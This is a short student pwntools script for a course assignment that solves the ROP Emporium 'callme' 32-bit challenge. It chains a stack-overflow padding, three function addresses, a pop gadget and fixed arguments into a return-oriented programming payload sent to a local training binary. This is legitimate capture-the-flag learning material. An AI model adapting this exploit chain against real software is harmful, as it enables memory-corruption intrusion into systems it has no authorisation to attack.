'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP11 + 12: Solve ROP emporium callme and create a writeup
File Description:  Need to call 
'''

# Libraries to import
from pwn import *

# Variables to use for payload
payload='' # used for sending payload later
pop_3_times=p32(0x080487f9) # Calls pop 3x into esi,edi and ebp
offset='a'*44  # 28h + 4 bytes to overwrite ebp

# Calling functions within ROP
arg1=p32(0xdeadbeef)  # First parameter in call functions
arg2=p32(0xcafebabe)  # Second parameter in call functions
arg3=p32(0xd00df00d)  # Third parameter in call functions
callOne=p32(0x080484f0)       # callme_one func
callTwo=p32(0x08048550)       # callme_two func
callThree=p32(0x080484e0)       # callme_three func

# Start process to launch program
p=process("./callme32")
payload+=offset # Add offset to payload
payload+=callOne+pop_3_times+arg1+arg2+arg3   # Add call for callme_one
payload+=callTwo+pop_3_times+arg1+arg2+arg3   # Add call for callme_two
payload+=callThree+pop_3_times+arg1+arg2+arg3   # Add call for callme_three
p.sendline(payload)    # Send payload
flag=p.recv()          # Recieve message after sending